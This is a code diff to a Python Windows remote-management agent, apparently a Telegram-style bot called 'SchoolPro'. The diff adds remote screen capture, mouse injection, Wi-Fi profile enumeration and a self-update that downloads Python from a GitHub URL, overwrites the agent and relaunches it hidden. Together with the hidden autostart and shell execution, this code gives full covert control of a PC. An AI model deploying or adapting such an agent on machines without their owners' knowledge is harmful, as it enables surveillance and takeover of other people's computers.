@@ -7,10 +7,13 @@ import contextlib
 import ctypes
 import ctypes.wintypes
 import getpass
+import hashlib
 import io
 import json
 import os
 import platform
+import py_compile
+import re
 import shlex
 import socket
 import subprocess
@@ -20,19 +23,27 @@ import time
 import uuid
 from pathlib import Path
 from typing import Any
+from urllib.parse import urlparse
 
 import psutil
 import requests
 from PIL import ImageGrab
 
 with contextlib.suppress(ImportError):
+    import tkinter as tk
+
+with contextlib.suppress(ImportError):
     import winreg
 
 
 EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.wintypes.HWND, ctypes.wintypes.LPARAM)
+GetSystemMetrics = ctypes.windll.user32.GetSystemMetrics
 GetWindowThreadProcessId = ctypes.windll.user32.GetWindowThreadProcessId
 IsWindowVisible = ctypes.windll.user32.IsWindowVisible
+LockWorkStation = ctypes.windll.user32.LockWorkStation
 PostMessageW = ctypes.windll.user32.PostMessageW
+SendInput = ctypes.windll.user32.SendInput
+SetCursorPos = ctypes.windll.user32.SetCursorPos
 GetWindowTextLengthW = ctypes.windll.user32.GetWindowTextLengthW
 GetWindowTextW = ctypes.windll.user32.GetWindowTextW
 WM_CLOSE = 0x0010
@@ -41,15 +52,42 @@ WM_CLOSE = 0x0010
 # Edit these values first.
 SERVER_URL = os.environ.get("PCBOT_SERVER_URL", "http://217.60.245.42:8090").strip()
 REGISTRATION_KEY = os.environ.get("PCBOT_REGISTRATION_KEY", "change-this-key").strip()
-HEARTBEAT_INTERVAL_SECONDS = max(5, int(os.environ.get("PCBOT_HEARTBEAT_INTERVAL", "10")))
-COMMAND_POLL_SECONDS = max(1, int(os.environ.get("PCBOT_COMMAND_POLL", "1")))
+DEFAULT_AGENT_UPDATE_URL = os.environ.get(
+    "PCBOT_AGENT_UPDATE_URL",
+    "https://raw.githubusercontent.com/pureoffic2/comfyUIAgent/main/pc_agent.py",
+).strip()
+HEARTBEAT_INTERVAL_SECONDS = max(5.0, float(os.environ.get("PCBOT_HEARTBEAT_INTERVAL", "10")))
+COMMAND_POLL_SECONDS = max(0.35, float(os.environ.get("PCBOT_COMMAND_POLL", "0.6")))
 HTTP_TIMEOUT_SECONDS = max(5, int(os.environ.get("PCBOT_HTTP_TIMEOUT", "15")))
-AGENT_VERSION = "1.1.1"
+WIFI_RECOVERY_COOLDOWN_SECONDS = max(10.0, float(os.environ.get("PCBOT_WIFI_RECOVERY_COOLDOWN", "35")))
+WIFI_CONNECT_SETTLE_SECONDS = max(3.0, float(os.environ.get("PCBOT_WIFI_CONNECT_SETTLE", "6")))
+TEXT_WINDOW_SECONDS = max(5, int(os.environ.get("PCBOT_TEXT_WINDOW_SECONDS", "25")))
+AGENT_VERSION = "1.3.0"
 SHELL_COMMAND_TIMEOUT_SECONDS = 25
 SHELL_COMMAND_CWD = str(Path.home())
 SHELL_COMMAND_PREVIEW_CHARS = 1600
 DEFAULT_STARTUP_ENTRY_NAME = "SchoolProAgent"
 LEGACY_STARTUP_ENTRY_NAMES = ("SafePcTelegramAgent",)
+REMOTE_FRAME_MAX_WIDTH = 1440
+REMOTE_FRAME_MAX_HEIGHT = 900
+REMOTE_FRAME_QUALITY = 62
+STANDARD_SCREENSHOT_MAX_WIDTH = 1600
+STANDARD_SCREENSHOT_MAX_HEIGHT = 900
+STANDARD_SCREENSHOT_QUALITY = 72
+CREATE_NO_WINDOW = getattr(subprocess, "CREATE_NO_WINDOW", 0)
+SM_CXSCREEN = 0
+SM_CYSCREEN = 1
+INPUT_MOUSE = 0
+MOUSEEVENTF_LEFTDOWN = 0x0002
+MOUSEEVENTF_LEFTUP = 0x0004
+MOUSEEVENTF_RIGHTDOWN = 0x0008
+MOUSEEVENTF_RIGHTUP = 0x0010
+MOUSEEVENTF_WHEEL = 0x0800
+WLAN_CLIENT_VERSION_LONGHORN = 2
+WLAN_AVAILABLE_NETWORK_CONNECTED = 0x00000001
+WLAN_AVAILABLE_NETWORK_HAS_PROFILE = 0x00000002
+WLAN_CONNECTION_MODE_PROFILE = 0
+DOT11_BSS_TYPE_ANY = 3
 
 
 # Optional launch aliases for /run and /restartapp.
@@ -89,6 +127,114 @@ WATCHED_SERVICES = [
 
 BASE_DIR = Path(__file__).resolve().parent
 STATE_PATH = BASE_DIR / "agent_state.json"
+
+
+class GUID(ctypes.Structure):
+    _fields_ = [
+        ("Data1", ctypes.wintypes.DWORD),
+        ("Data2", ctypes.wintypes.WORD),
+        ("Data3", ctypes.wintypes.WORD),
+        ("Data4", ctypes.c_ubyte * 8),
+    ]
+
+
+class WLAN_INTERFACE_INFO(ctypes.Structure):
+    _fields_ = [
+        ("InterfaceGuid", GUID),
+        ("strInterfaceDescription", ctypes.wintypes.WCHAR * 256),
+        ("isState", ctypes.wintypes.DWORD),
+    ]
+
+
+class WLAN_INTERFACE_INFO_LIST(ctypes.Structure):
+    _fields_ = [
+        ("dwNumberOfItems", ctypes.wintypes.DWORD),
+        ("dwIndex", ctypes.wintypes.DWORD),
+        ("InterfaceInfo", WLAN_INTERFACE_INFO * 1),
+    ]
+
+
+class WLAN_PROFILE_INFO(ctypes.Structure):
+    _fields_ = [
+        ("strProfileName", ctypes.wintypes.WCHAR * 256),
+        ("dwFlags", ctypes.wintypes.DWORD),
+    ]
+
+
+class WLAN_PROFILE_INFO_LIST(ctypes.Structure):
+    _fields_ = [
+        ("dwNumberOfItems", ctypes.wintypes.DWORD),
+        ("dwIndex", ctypes.wintypes.DWORD),
+        ("ProfileInfo", WLAN_PROFILE_INFO * 1),
+    ]
+
+
+class DOT11_SSID(ctypes.Structure):
+    _fields_ = [
+        ("uSSIDLength", ctypes.wintypes.ULONG),
+        ("ucSSID", ctypes.c_ubyte * 32),
+    ]
+
+
+class WLAN_AVAILABLE_NETWORK(ctypes.Structure):
+    _fields_ = [
+        ("strProfileName", ctypes.wintypes.WCHAR * 256),
+        ("dot11Ssid", DOT11_SSID),
+        ("dot11BssType", ctypes.wintypes.DWORD),
+        ("uNumberOfBssids", ctypes.wintypes.DWORD),
+        ("bNetworkConnectable", ctypes.wintypes.BOOL),
+        ("wlanNotConnectableReason", ctypes.wintypes.DWORD),
+        ("uNumberOfPhyTypes", ctypes.wintypes.DWORD),
+        ("dot11PhyTypes", ctypes.wintypes.DWORD * 8),
+        ("bMorePhyTypes", ctypes.wintypes.BOOL),
+        ("wlanSignalQuality", ctypes.wintypes.DWORD),
+        ("bSecurityEnabled", ctypes.wintypes.BOOL),
+        ("dot11DefaultAuthAlgorithm", ctypes.wintypes.DWORD),
+        ("dot11DefaultCipherAlgorithm", ctypes.wintypes.DWORD),
+        ("dwFlags", ctypes.wintypes.DWORD),
+        ("dwReserved", ctypes.wintypes.DWORD),
+    ]
+
+
+class WLAN_AVAILABLE_NETWORK_LIST(ctypes.Structure):
+    _fields_ = [
+        ("dwNumberOfItems", ctypes.wintypes.DWORD),
+        ("dwIndex", ctypes.wintypes.DWORD),
+        ("Network", WLAN_AVAILABLE_NETWORK * 1),
+    ]
+
+
+class WLAN_CONNECTION_PARAMETERS(ctypes.Structure):
+    _fields_ = [
+        ("wlanConnectionMode", ctypes.wintypes.DWORD),
+        ("strProfile", ctypes.wintypes.LPCWSTR),
+        ("pDot11Ssid", ctypes.c_void_p),
+        ("pDesiredBssidList", ctypes.c_void_p),
+        ("dot11BssType", ctypes.wintypes.DWORD),
+        ("dwFlags", ctypes.wintypes.DWORD),
+    ]
+
+
+class MOUSEINPUT(ctypes.Structure):
+    _fields_ = [
+        ("dx", ctypes.wintypes.LONG),
+        ("dy", ctypes.wintypes.LONG),
+        ("mouseData", ctypes.wintypes.DWORD),
+        ("dwFlags", ctypes.wintypes.DWORD),
+        ("time", ctypes.wintypes.DWORD),
+        ("dwExtraInfo", ctypes.c_size_t),
+    ]
+
+
+class INPUT_UNION(ctypes.Union):
+    _fields_ = [("mi", MOUSEINPUT)]
+
+
+class INPUT(ctypes.Structure):
+    _fields_ = [
+        ("type", ctypes.wintypes.DWORD),
+        ("union", INPUT_UNION),
+    ]
 
 
 def appdata_roaming_dir() -> Path:
@@ -204,7 +350,7 @@ def cleanup_legacy_scheduled_tasks() -> None:
             check=False,
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
-            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
+            creationflags=CREATE_NO_WINDOW,
         )
 
 
@@ -333,6 +479,244 @@ def get_top_process_lines(limit: int = 8) -> list[str]:
     ]
 
 
+def wlan_available() -> bool:
+    return hasattr(ctypes.windll, "wlanapi")
+
+
+def wlan_call(function: Any, *args: Any) -> None:
+    code = function(*args)
+    if code != 0:
+        raise OSError(f"WLAN error {code}")
+
+
+def decode_dot11_ssid(value: DOT11_SSID) -> str:
+    raw = bytes(value.ucSSID[: value.uSSIDLength])
+    return raw.decode("utf-8", errors="ignore")
+
+
+class WlanClient:
+    def __init__(self) -> None:
+        if not wlan_available():
+            raise OSError("wlanapi unavailable")
+        self.handle = ctypes.wintypes.HANDLE()
+        negotiated_version = ctypes.wintypes.DWORD()
+        wlan_call(
+            ctypes.windll.wlanapi.WlanOpenHandle,
+            WLAN_CLIENT_VERSION_LONGHORN,
+            None,
+            ctypes.byref(negotiated_version),
+            ctypes.byref(self.handle),
+        )
+
+    def close(self) -> None:
+        if self.handle:
+            ctypes.windll.wlanapi.WlanCloseHandle(self.handle, None)
+            self.handle = ctypes.wintypes.HANDLE()
+
+    def __enter__(self) -> "WlanClient":
+        return self
+
+    def __exit__(self, exc_type: Any, exc: Any, tb: Any) -> None:
+        self.close()
+
+    def _list_from_pointer(self, pointer: ctypes.c_void_p, header_type: type[Any], item_type: type[Any], field_name: str) -> list[Any]:
+        header = ctypes.cast(pointer, ctypes.POINTER(header_type)).contents
+        count = int(header.dwNumberOfItems)
+        first_offset = getattr(header_type, field_name).offset
+        array_type = item_type * max(count, 1)
+        array_ptr = ctypes.cast(ctypes.addressof(header) + first_offset, ctypes.POINTER(array_type))
+        return list(array_ptr.contents[:count])
+
+    def interfaces(self) -> list[WLAN_INTERFACE_INFO]:
+        pointer = ctypes.c_void_p()
+        wlan_call(ctypes.windll.wlanapi.WlanEnumInterfaces, self.handle, None, ctypes.byref(pointer))
+        try:
+            return self._list_from_pointer(pointer, WLAN_INTERFACE_INFO_LIST, WLAN_INTERFACE_INFO, "InterfaceInfo")
+        finally:
+            ctypes.windll.wlanapi.WlanFreeMemory(pointer)
+
+    def profiles(self, interface_guid: GUID) -> list[WLAN_PROFILE_INFO]:
+        pointer = ctypes.c_void_p()
+        wlan_call(
+            ctypes.windll.wlanapi.WlanGetProfileList,
+            self.handle,
+            ctypes.byref(interface_guid),
+            None,
+            ctypes.byref(pointer),
+        )
+        try:
+            return self._list_from_pointer(pointer, WLAN_PROFILE_INFO_LIST, WLAN_PROFILE_INFO, "ProfileInfo")
+        finally:
+            ctypes.windll.wlanapi.WlanFreeMemory(pointer)
+
+    def available_networks(self, interface_guid: GUID) -> list[WLAN_AVAILABLE_NETWORK]:
+        pointer = ctypes.c_void_p()
+        wlan_call(
+            ctypes.windll.wlanapi.WlanGetAvailableNetworkList,
+            self.handle,
+            ctypes.byref(interface_guid),
+            0,
+            None,
+            ctypes.byref(pointer),
+        )
+        try:
+            return self._list_from_pointer(pointer, WLAN_AVAILABLE_NETWORK_LIST, WLAN_AVAILABLE_NETWORK, "Network")
+        finally:
+            ctypes.windll.wlanapi.WlanFreeMemory(pointer)
+
+    def connect_profile(self, interface_guid: GUID, profile_name: str) -> None:
+        params = WLAN_CONNECTION_PARAMETERS(
+            wlanConnectionMode=WLAN_CONNECTION_MODE_PROFILE,
+            strProfile=profile_name,
+            pDot11Ssid=None,
+            pDesiredBssidList=None,
+            dot11BssType=DOT11_BSS_TYPE_ANY,
+            dwFlags=0,
+        )
+        wlan_call(
+            ctypes.windll.wlanapi.WlanConnect,
+            self.handle,
+            ctypes.byref(interface_guid),
+            ctypes.byref(params),
+            None,
+        )
+
+
+def list_wifi_profiles() -> list[str]:
+    if not wlan_available():
+        return []
+    names: list[str] = []
+    try:
+        with WlanClient() as client:
+            for interface_info in client.interfaces():
+                for profile in client.profiles(interface_info.InterfaceGuid):
+                    name = profile.strProfileName.strip()
+                    if name and name not in names:
+                        names.append(name)
+    except Exception:
+        return []
+    return names
+
+
+def network_probe_targets() -> list[tuple[str, int]]:
+    parsed = urlparse(SERVER_URL)
+    targets: list[tuple[str, int]] = []
+    if parsed.hostname:
+        targets.append((parsed.hostname, parsed.port or (443 if parsed.scheme == "https" else 80)))
+    targets.extend([("1.1.1.1", 53), ("8.8.8.8", 53)])
+    unique: list[tuple[str, int]] = []
+    for target in targets:
+        if target not in unique:
+            unique.append(target)
+    return unique
+
+
+def network_reachable(timeout: float = 2.0) -> bool:
+    for host, port in network_probe_targets():
+        try:
+            with socket.create_connection((host, port), timeout=timeout):
+                return True
+        except OSError:
+            continue
+    return False
+
+
+def get_wifi_status() -> dict[str, Any]:
+    info: dict[str, Any] = {
+        "profiles": [],
+        "visible_profiles": [],
+        "connected_profile": None,
+        "connected_signal": None,
+        "available": wlan_available(),
+        "internet_ok": network_reachable(timeout=1.0),
+    }
+    if not info["available"]:
+        return info
+    try:
+        with WlanClient() as client:
+            profiles = list_wifi_profiles()
+            visible_rows: list[dict[str, Any]] = []
+            connected_profile = None
+            connected_signal = None
+            for interface_info in client.interfaces():
+                for network in client.available_networks(interface_info.InterfaceGuid):
+                    profile_name = network.strProfileName.strip() or decode_dot11_ssid(network.dot11Ssid)
+                    if not profile_name:
+                        continue
+                    row = {
+                        "profile": profile_name,
+                        "ssid": decode_dot11_ssid(network.dot11Ssid),
+                        "signal": int(network.wlanSignalQuality),
+                        "connected": bool(network.dwFlags & WLAN_AVAILABLE_NETWORK_CONNECTED),
+                        "has_profile": bool(network.dwFlags & WLAN_AVAILABLE_NETWORK_HAS_PROFILE),
+                    }
+                    visible_rows.append(row)
+                    if row["connected"] and connected_profile is None:
+                        connected_profile = profile_name
+                        connected_signal = row["signal"]
+            visible_rows.sort(key=lambda item: (0 if item["connected"] else 1, -item["signal"], item["profile"].lower()))
+            info["profiles"] = profiles
+            info["visible_profiles"] = visible_rows
+            info["connected_profile"] = connected_profile
+            info["connected_signal"] = connected_signal
+            return info
+    except Exception:
+        return info
+
+
+def attempt_wifi_recovery() -> dict[str, Any]:
+    status = get_wifi_status()
+    if not status.get("available"):
+        raise ValueError("На этом ПК не найден Wi-Fi интерфейс.")
+
+    profiles = [str(name) for name in status.get("profiles", []) if str(name).strip()]
+    visible_rows = [row for row in status.get("visible_profiles", []) if row.get("has_profile")]
+    ordered: list[str] = []
+    for row in visible_rows:
+        name = str(row.get("profile", "")).strip()
+        if name and name not in ordered:
+            ordered.append(name)
+    for name in profiles:
+        if name not in ordered:
+            ordered.append(name)
+    if not ordered:
+        raise ValueError("Не найдено сохранённых Wi-Fi профилей для переподключения.")
+
+    attempts: list[str] = []
+    with WlanClient() as client:
+        interfaces = client.interfaces()
+        if not interfaces:
+            raise ValueError("Wi-Fi интерфейс не найден.")
+        interface_info = interfaces[0]
+        for profile_name in ordered[:8]:
+            attempts.append(profile_name)
+            try:
+                client.connect_profile(interface_info.InterfaceGuid, profile_name)
+            except Exception:
+                continue
+            deadline = time.time() + WIFI_CONNECT_SETTLE_SECONDS
+            while time.time() < deadline:
+                if network_reachable(timeout=1.0):
+                    refreshed = get_wifi_status()
+                    connected = refreshed.get("connected_profile") or profile_name
+                    signal = refreshed.get("connected_signal")
+                    signal_text = f" ({signal}%)" if isinstance(signal, int) else ""
+                    return {
+                        "ok": True,
+                        "message": f"Wi-Fi восстановлен через профиль {connected}{signal_text}.",
+                        "data": {
+                            "profile": connected,
+                            "attempts": attempts,
+                            "wifi": refreshed,
+                        },
+                    }
+                time.sleep(1.0)
+    raise ValueError(
+        "Не удалось восстановить Wi-Fi автоматически. Попробованы профили: "
+        + ", ".join(attempts)
+    )
+
+
 def collect_snapshot(previous_net: dict[str, Any] | None) -> tuple[dict[str, Any], dict[str, Any]]:
     vm = psutil.virtual_memory()
     system_drive = os.environ.get("SystemDrive", "C:")
@@ -347,6 +731,7 @@ def collect_snapshot(previous_net: dict[str, Any] | None) -> tuple[dict[str, Any
         down_per_sec = max(net.bytes_recv - previous_net["bytes_recv"], 0) / elapsed
         up_per_sec = max(net.bytes_sent - previous_net["bytes_sent"], 0) / elapsed
 
+    wifi = get_wifi_status()
     snapshot = {
         "hostname": socket.gethostname(),
         "username": getpass.getuser(),
@@ -367,6 +752,11 @@ def collect_snapshot(previous_net: dict[str, Any] | None) -> tuple[dict[str, Any
         "apps": get_app_lines(),
         "top_processes": get_top_process_lines(),
         "jobs": get_job_lines(),
+        "wifi_profile": wifi.get("connected_profile"),
+        "wifi_signal": wifi.get("connected_signal"),
+        "wifi_known_profiles": [row.get("profile") for row in wifi.get("visible_profiles", []) if row.get("profile")],
+        "wifi_profiles_saved": wifi.get("profiles", []),
+        "internet_ok": bool(wifi.get("internet_ok")),
     }
     next_net = {
         "bytes_recv": net.bytes_recv,
@@ -400,6 +790,8 @@ def ensure_registered(session: requests.Session) -> dict[str, Any]:
         state["device_id"] = stable_device_id()
     if "display_name" not in state:
         state["display_name"] = socket.gethostname()
+    if not str(state.get("update_url") or "").strip():
+        state["update_url"] = DEFAULT_AGENT_UPDATE_URL
     if "agent_token" not in state:
         state = register_agent(session, state)
     return state
@@ -467,6 +859,12 @@ def post_result(
 
 
 def info_text(snapshot: dict[str, Any]) -> str:
+    wifi_profile = snapshot.get("wifi_profile") or "н/д"
+    wifi_signal = snapshot.get("wifi_signal")
+    wifi_line = f"{wifi_profile}"
+    if wifi_signal is not None:
+        wifi_line += f" ({wifi_signal}%)"
+    internet_state = "ok" if snapshot.get("internet_ok") else "нет"
     return (
         f"Хост: {snapshot['hostname']}\n"
         f"Пользователь: {snapshot['username']}\n"
@@ -477,7 +875,9 @@ def info_text(snapshot: dict[str, Any]) -> str:
         f"({human_bytes(snapshot['memory_used'])}/{human_bytes(snapshot['memory_total'])})\n"
         f"Диск C: {snapshot['disk_percent']}% "
         f"(свободно {human_bytes(snapshot['disk_free'])} из {human_bytes(snapshot['disk_total'])})\n"
-        f"IP: {', '.join(snapshot['ip_addresses']) or 'н/д'}"
+        f"IP: {', '.join(snapshot['ip_addresses']) or 'н/д'}\n"
+        f"Wi-Fi: {wifi_line}\n"
+        f"Интернет: {internet_state}"
     )
 
 
@@ -744,17 +1144,49 @@ def restart_alias(alias: str) -> str:
     return f"{close_message}\n{start_message}"
 
 
-def screenshot_data() -> tuple[str, str]:
+def get_screen_size() -> tuple[int, int]:
+    return max(GetSystemMetrics(SM_CXSCREEN), 1), max(GetSystemMetrics(SM_CYSCREEN), 1)
+
+
+def capture_screen(max_width: int, max_height: int, quality: int) -> tuple[str, str, dict[str, Any]]:
+    width, height = get_screen_size()
     image = ImageGrab.grab()
     image = image.convert("RGB")
-    image.thumbnail((1600, 900))
+    image.thumbnail((max_width, max_height))
     buffer = io.BytesIO()
-    image.save(buffer, format="JPEG", quality=72, optimize=True)
-    return "desktop.jpg", base64.b64encode(buffer.getvalue()).decode("ascii")
+    image.save(buffer, format="JPEG", quality=quality, optimize=True)
+    return (
+        "desktop.jpg",
+        base64.b64encode(buffer.getvalue()).decode("ascii"),
+        {
+            "screen_width": width,
+            "screen_height": height,
+            "image_width": image.width,
+            "image_height": image.height,
+            "captured_at": int(time.time()),
+        },
+    )
+
+
+def screenshot_data() -> tuple[str, str]:
+    file_name, file_b64, _ = capture_screen(
+        max_width=STANDARD_SCREENSHOT_MAX_WIDTH,
+        max_height=STANDARD_SCREENSHOT_MAX_HEIGHT,
+        quality=STANDARD_SCREENSHOT_QUALITY,
+    )
+    return file_name, file_b64
+
+
+def remote_frame_data() -> tuple[str, str, dict[str, Any]]:
+    return capture_screen(
+        max_width=REMOTE_FRAME_MAX_WIDTH,
+        max_height=REMOTE_FRAME_MAX_HEIGHT,
+        quality=REMOTE_FRAME_QUALITY,
+    )
 
 
 def lock_pc() -> str:
-    ctypes.windll.user32.LockWorkStation()
+    LockWorkStation()
     return "Команда блокировки отправлена."
 
 
@@ -766,6 +1198,92 @@ def restart_pc() -> str:
 def shutdown_pc() -> str:
     subprocess.Popen(["shutdown", "/s", "/t", "5"], shell=False)
     return "Выключение запланировано через 5 секунд."
+
+
+def get_mouse_sender(flags: int, data: int = 0) -> INPUT:
+    return INPUT(
+        type=INPUT_MOUSE,
+        union=INPUT_UNION(
+            mi=MOUSEINPUT(
+                dx=0,
+                dy=0,
+                mouseData=data,
+                dwFlags=flags,
+                time=0,
+                dwExtraInfo=0,
+            )
+        ),
+    )
+
+
+def send_mouse_flags(flags: int, data: int = 0) -> None:
+    input_item = get_mouse_sender(flags, data)
+    result = SendInput(1, ctypes.byref(input_item), ctypes.sizeof(INPUT))
+    if result != 1:
+        raise OSError("Не удалось отправить мышиное событие.")
+
+
+def clamp_coordinate(value: float, minimum: int, maximum: int) -> int:
+    return max(minimum, min(int(round(value)), maximum))
+
+
+def move_cursor(x: float, y: float) -> tuple[int, int]:
+    screen_width, screen_height = get_screen_size()
+    target_x = clamp_coordinate(x, 0, max(screen_width - 1, 0))
+    target_y = clamp_coordinate(y, 0, max(screen_height - 1, 0))
+    if not SetCursorPos(target_x, target_y):
+        raise OSError("Не удалось переместить курсор.")
+    return target_x, target_y
+
+
+def perform_remote_input(args: dict[str, Any]) -> dict[str, Any]:
+    action = str(args.get("action", "")).strip().lower()
+    x = float(args.get("x", 0))
+    y = float(args.get("y", 0))
+    button = str(args.get("button", "left")).strip().lower() or "left"
+    target_x, target_y = move_cursor(x, y)
+
+    if action == "move":
+        return {
+            "ok": True,
+            "message": f"Курсор перемещён в {target_x}, {target_y}.",
+            "data": {"x": target_x, "y": target_y, "action": action},
+        }
+    if action == "click":
+        if button == "right":
+            send_mouse_flags(MOUSEEVENTF_RIGHTDOWN)
+            send_mouse_flags(MOUSEEVENTF_RIGHTUP)
+        else:
+            send_mouse_flags(MOUSEEVENTF_LEFTDOWN)
+            send_mouse_flags(MOUSEEVENTF_LEFTUP)
+        return {
+            "ok": True,
+            "message": f"Клик {button} в {target_x}, {target_y}.",
+            "data": {"x": target_x, "y": target_y, "action": action, "button": button},
+        }
+    if action == "button_down":
+        send_mouse_flags(MOUSEEVENTF_RIGHTDOWN if button == "right" else MOUSEEVENTF_LEFTDOWN)
+        return {
+            "ok": True,
+            "message": f"Кнопка {button} зажата в {target_x}, {target_y}.",
+            "data": {"x": target_x, "y": target_y, "action": action, "button": button},
+        }
+    if action == "button_up":
+        send_mouse_flags(MOUSEEVENTF_RIGHTUP if button == "right" else MOUSEEVENTF_LEFTUP)
+        return {
+            "ok": True,
+            "message": f"Кнопка {button} отпущена в {target_x}, {target_y}.",
+            "data": {"x": target_x, "y": target_y, "action": action, "button": button},
+        }
+    if action == "scroll":
+        delta = int(args.get("delta", 0))
+        send_mouse_flags(MOUSEEVENTF_WHEEL, delta)
+        return {
+            "ok": True,
+            "message": f"Колесо прокручено на {delta}.",
+            "data": {"x": target_x, "y": target_y, "action": action, "delta": delta},
+        }
+    raise ValueError(f"Неподдерживаемое remote-действие: {action}")
 
 
 def install_registry_run_entry(entry_name: str, command_line: str) -> bool:
@@ -911,7 +1429,7 @@ def uninstall_self() -> dict[str, Any]:
     subprocess.Popen(
         ["cmd.exe", "/c", str(cleanup_script)],
         shell=False,
-        creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
+        creationflags=CREATE_NO_WINDOW,
     )
     return {
         "ok": True,
@@ -924,7 +1442,223 @@ def uninstall_self() -> dict[str, Any]:
     }
 
 
-def handle_command(command: dict[str, Any], snapshot: dict[str, Any]) -> dict[str, Any]:
+def parse_remote_version(source_text: str) -> str | None:
+    match = re.search(r'^AGENT_VERSION\s*=\s*"([^"]+)"', source_text, flags=re.MULTILINE)
+    if match:
+        return match.group(1)
+    return None
+
+
+def write_temp_python_source(source_text: str) -> Path:
+    temp_dir = Path(tempfile.gettempdir())
+    temp_path = temp_dir / f"schoolpro_agent_update_{os.getpid()}.py"
+    temp_path.write_text(source_text, encoding="utf-8")
+    return temp_path
+
+
+def resolve_update_url(state: dict[str, Any]) -> str:
+    raw = str(state.get("update_url") or DEFAULT_AGENT_UPDATE_URL).strip()
+    if not raw:
+        raise ValueError("URL обновления не настроен.")
+    return raw
+
+
+def ensure_hidden_python() -> Path:
+    current = Path(sys.executable).resolve()
+    pythonw = current.with_name("pythonw.exe")
+    return pythonw if pythonw.exists() else current
+
+
+def restart_self() -> None:
+    launcher = ensure_hidden_python()
+    subprocess.Popen(
+        [str(launcher), str(Path(__file__).resolve())],
+        shell=False,
+        cwd=str(BASE_DIR),
+        creationflags=CREATE_NO_WINDOW,
+    )
+
+
+def update_install_summary() -> None:
+    state = load_state()
+    summary = "\n".join(
+        [
+            "SchoolPro installed.",
+            "",
+            "Folder:",
+            str(BASE_DIR),
+            "",
+            "Agent file:",
+            str(Path(__file__).resolve()),
+            "",
+            "Startup entry:",
+            str(state.get("startup_entry_name") or startup_entry_name()),
+            "",
+            "Autostart mode:",
+            str(state.get("startup_mode") or "per-user hidden logon start"),
+            "",
+            "Update URL:",
+            str(state.get("update_url") or DEFAULT_AGENT_UPDATE_URL),
+            "",
+        ]
+    )
+    (BASE_DIR / "INSTALL.txt").write_text(summary, encoding="utf-8")
+
+
+def perform_self_update(session: requests.Session) -> dict[str, Any]:
+    state = load_state()
+    update_url = resolve_update_url(state)
+    response = session.get(update_url, timeout=HTTP_TIMEOUT_SECONDS)
+    response.raise_for_status()
+    source_text = response.text
+    if "def handle_command" not in source_text or "AGENT_VERSION" not in source_text:
+        raise ValueError("Скачанный файл не похож на pc_agent.py")
+
+    temp_source = write_temp_python_source(source_text)
+    try:
+        py_compile.compile(str(temp_source), doraise=True)
+    finally:
+        with contextlib.suppress(FileNotFoundError):
+            temp_source.unlink()
+
+    current_path = Path(__file__).resolve()
+    current_bytes = current_path.read_bytes()
+    incoming_bytes = source_text.encode("utf-8")
+    current_hash = hashlib.sha256(current_bytes).hexdigest()
+    incoming_hash = hashlib.sha256(incoming_bytes).hexdigest()
+    remote_version = parse_remote_version(source_text) or "unknown"
+    if current_hash == incoming_hash:
+        install_startup_task()
+        update_install_summary()
+        return {
+            "ok": True,
+            "message": f"Агент уже актуален. Версия {AGENT_VERSION}.",
+            "data": {
+                "version": AGENT_VERSION,
+                "remote_version": remote_version,
+                "updated": False,
+                "update_url": update_url,
+            },
+        }
+
+    backup_path = current_path.with_suffix(".py.bak")
+    backup_path.write_bytes(current_bytes)
+    current_path.write_text(source_text, encoding="utf-8")
+
+    state["update_url"] = update_url
+    save_state(state)
+    install_startup_task()
+    update_install_summary()
+
+    return {
+        "ok": True,
+        "message": f"Агент обновлён до версии {remote_version}. Перезапускаю процесс.",
+        "data": {
+            "version": AGENT_VERSION,
+            "remote_version": remote_version,
+            "updated": True,
+            "update_url": update_url,
+        },
+        "restart_after_result": True,
+    }
+
+
+def encode_popup_text(text: str) -> str:
+    return base64.urlsafe_b64encode(text.encode("utf-8")).decode("ascii")
+
+
+def decode_popup_text(encoded: str) -> str:
+    padding = "=" * (-len(encoded) % 4)
+    return base64.urlsafe_b64decode((encoded + padding).encode("ascii")).decode("utf-8")
+
+
+def show_text_popup(text: str) -> dict[str, Any]:
+    value = text.strip()
+    if not value:
+        raise ValueError("После /text нужно передать текст.")
+    launcher = ensure_hidden_python()
+    subprocess.Popen(
+        [
+            str(launcher),
+            str(Path(__file__).resolve()),
+            "--show-text-b64",
+            encode_popup_text(value),
+        ],
+        shell=False,
+        cwd=str(BASE_DIR),
+        creationflags=CREATE_NO_WINDOW,
+    )
+    return {
+        "ok": True,
+        "message": "Текстовое окно показано на экране.",
+        "data": {"text": value, "duration_seconds": TEXT_WINDOW_SECONDS},
+    }
+
+
+def render_popup_window(text: str) -> None:
+    if "tk" not in globals():
+        raise RuntimeError("Tkinter недоступен для показа текста.")
+    root = tk.Tk()
+    root.title("SchoolPro")
+    root.configure(bg="#0f172a")
+    root.attributes("-topmost", True)
+    root.minsize(520, 220)
+    screen_w = root.winfo_screenwidth()
+    screen_h = root.winfo_screenheight()
+    width = min(760, max(520, screen_w - 160))
+    height = min(320, max(220, screen_h // 3))
+    pos_x = max((screen_w - width) // 2, 20)
+    pos_y = max((screen_h - height) // 3, 20)
+    root.geometry(f"{width}x{height}+{pos_x}+{pos_y}")
+
+    frame = tk.Frame(root, bg="#0f172a", padx=24, pady=24)
+    frame.pack(fill="both", expand=True)
+    title = tk.Label(
+        frame,
+        text="Сообщение",
+        fg="#f8fafc",
+        bg="#0f172a",
+        font=("Segoe UI Semibold", 18),
+    )
+    title.pack(anchor="w")
+    label = tk.Label(
+        frame,
+        text=text,
+        fg="#e2e8f0",
+        bg="#0f172a",
+        justify="left",
+        wraplength=width - 60,
+        font=("Segoe UI", 22),
+    )
+    label.pack(fill="both", expand=True, pady=(18, 12))
+    close_button = tk.Button(
+        frame,
+        text="Закрыть",
+        command=root.destroy,
+        bg="#38bdf8",
+        fg="#082f49",
+        relief="flat",
+        padx=18,
+        pady=8,
+        font=("Segoe UI Semibold", 12),
+    )
+    close_button.pack(anchor="e")
+    root.after(TEXT_WINDOW_SECONDS * 1000, root.destroy)
+    root.mainloop()
+
+
+def maybe_recover_wifi(last_attempt_at: float, reason: str, force: bool = False) -> tuple[float, str | None]:
+    if not force and (time.time() - last_attempt_at) < WIFI_RECOVERY_COOLDOWN_SECONDS:
+        return last_attempt_at, None
+    try:
+        result = attempt_wifi_recovery()
+        message = result.get("message", f"Wi-Fi recovery ok ({reason}).")
+    except Exception as exc:
+        message = f"Wi-Fi recovery failed ({reason}): {exc}"
+    return time.time(), message
+
+
